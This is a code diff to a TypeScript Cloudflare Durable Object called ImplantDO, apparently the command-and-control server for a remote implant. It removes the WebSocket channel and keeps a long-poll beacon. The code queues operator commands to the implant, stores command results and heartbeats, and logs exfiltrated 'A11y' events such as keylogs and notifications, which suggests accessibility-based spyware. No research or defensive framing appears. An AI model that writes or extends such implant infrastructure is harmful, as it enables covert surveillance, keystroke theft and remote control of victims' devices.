@@ -14,7 +14,6 @@ interface CommandResult {
 }
 
 export class ImplantDO extends DurableObject {
-  private sessions: Map<string, { connectedAt: number; lastPing: number }>;
   private lastHeartbeat: number = 0;
   private implantInfo: any = null;
 
@@ -27,7 +26,6 @@ export class ImplantDO extends DurableObject {
 
   constructor(state: DurableObjectState, env: Env) {
     super(state, env);
-    this.sessions = new Map();
     this.ctx.storage.sql.exec(
       `CREATE TABLE IF NOT EXISTS command_queue (
         id TEXT PRIMARY KEY,
@@ -216,12 +214,7 @@ export class ImplantDO extends DurableObject {
   async fetch(request: Request): Promise<Response> {
     const url = new URL(request.url);
 
-    // WebSocket upgrade from implant
-    if (request.headers.get('Upgrade') === 'websocket') {
-      return this.handleWebSocketUpgrade(request, url.pathname.split('/')[2] || 'wss');
-    }
-
-    // Long-poll beacon transport (no WebSocket involved)
+    // Long-poll beacon transport (the only transport; WebSocket was removed)
     if (url.pathname.startsWith('/poll/') && request.method === 'POST') {
       return this.handlePoll(request);
     }
@@ -236,26 +229,6 @@ export class ImplantDO extends DurableObject {
     }
 
     return new Response('Not found', { status: 404 });
-  }
-
-  private handleWebSocketUpgrade(request: Request, _transportType: string): Response {
-    const pair = new WebSocketPair();
-    const [client, server] = Object.values(pair) as [WebSocket, WebSocket];
-
-    this.ctx.acceptWebSocket(server, ['implant']);
-
-    this.sessions.set('primary', {
-      connectedAt: Date.now(),
-      lastPing: Date.now(),
-    });
-
-    // Flush pending commands to the implant upon connection
-    this.flushQueue(server);
-
-    return new Response(null, {
-      status: 101,
-      webSocket: client,
-    });
   }
 
   private handleOperatorRPC(body: any): Response {
@@ -273,24 +246,7 @@ export class ImplantDO extends DurableObject {
         // are the same queue — no separate "online socket" concept to get wrong.
         const pushed = this.wakeWaiter(payload?.implantId || '');
 
-        // Legacy WebSocket delivery, kept until the beacon path replaces it.
-        let sent = pushed;
-        if (!sent) {
-          for (const ws of this.ctx.getWebSockets()) {
-            if (ws.readyState === WebSocket.OPEN) {
-              const frame = JSON.stringify({
-                id: cmdId,
-                c: payload?.command,
-                p: payload?.payload || {},
-              });
-              ws.send(frame);
-              sent = true;
-              this.markSent(cmdId);
-              break;
-            }
-          }
-        }
-        return new Response(JSON.stringify({ success: true, cmdId, sent }), {
+        return new Response(JSON.stringify({ success: true, cmdId, sent: pushed }), {
           headers: { 'Content-Type': 'application/json' },
         });
       }
@@ -330,7 +286,6 @@ export class ImplantDO extends DurableObject {
       }
 
       case 'get_status': {
-        const sockets = this.ctx.getWebSockets();
         const now = Date.now();
         const hb = parseInt(this.getMeta('last_heartbeat') || '0') || this.lastHeartbeat;
         const lastPoll = parseInt(this.getMeta('last_poll') || '0');
@@ -345,9 +300,8 @@ export class ImplantDO extends DurableObject {
         return new Response(JSON.stringify({
           success: true,
           status: {
-            connected: sockets.length > 0 || beaconLive,
-            transport: sockets.length > 0 ? 'websocket' : (beaconLive ? 'beacon' : 'none'),
-            sessions: sockets.length,
+            connected: beaconLive,
+            transport: beaconLive ? 'beacon' : 'none',
             lastHeartbeat: hb,
             lastPoll,
             ageSeconds: lastPoll ? Math.round((now - lastPoll) / 1000) : null,
@@ -379,72 +333,5 @@ export class ImplantDO extends DurableObject {
           headers: { 'Content-Type': 'application/json' },
         });
     }
-  }
-
-  private flushQueue(ws: WebSocket) {
-    const pending = this.ctx.storage.sql.exec(
-      `SELECT id, command, payload FROM command_queue WHERE status = 'pending'`
-    ).toArray();
-    for (const row of pending) {
-      const frame = JSON.stringify({
-        id: row.id as string,
-        c: row.command as string,
-        p: JSON.parse(String(row.payload || '{}')),
-      });
-      ws.send(frame);
-      this.markSent(row.id as string);
-    }
-  }
-
-  // --- WebSocket Hibernation Handlers ---
-
-  async webSocketMessage(ws: WebSocket, message: string | ArrayBuffer) {
-    try {
-      const raw = typeof message === 'string' ? message : new TextDecoder().decode(message);
-      const parsed = JSON.parse(raw);
-
-      if (parsed.type === 'heartbeat') {
-        this.lastHeartbeat = parsed.ts || Date.now();
-        this.setMeta('last_heartbeat', String(this.lastHeartbeat));
-        if (parsed.info) {
-          this.implantInfo = parsed.info;
-          this.setMeta('implant_info', JSON.stringify(parsed.info));
-        }
-        this.sessions.set('primary', {
-          connectedAt: this.sessions.get('primary')?.connectedAt || Date.now(),
-          lastPing: Date.now(),
-        });
-        return;
-      }
-
-      if (parsed.type === 'result' && parsed.id) {
-        // Implant executed a command — store the result
-        this.ctx.storage.sql.exec(
-          `UPDATE command_queue SET status = 'completed', result = ?, completed_at = ? WHERE id = ?`,
-          parsed.data || '', parsed.ts || Date.now(), parsed.id
-        );
-        return;
-      }
-
-      if (parsed.type === 'event') {
-        // A11y exfil event (keylog, notification, etc.)
-        this.ctx.storage.sql.exec(
-          `INSERT INTO implant_events (type, tag, data, ts) VALUES (?, ?, ?, ?)`,
-          parsed.type, parsed.tag || 'unknown', parsed.data || '', Date.now()
-        );
-        return;
-      }
-
-      if (parsed.type === 'handshake_response') {
-        this.implantInfo = { ...this.implantInfo, pub: parsed.pub };
-        return;
-      }
-    } catch (e) {
-      console.error('Invalid frame from implant:', e);
-    }
-  }
-
-  async webSocketClose(_ws: WebSocket, _code: number, _reason: string, _wasClean: boolean) {
-    this.sessions.clear();
   }
 }
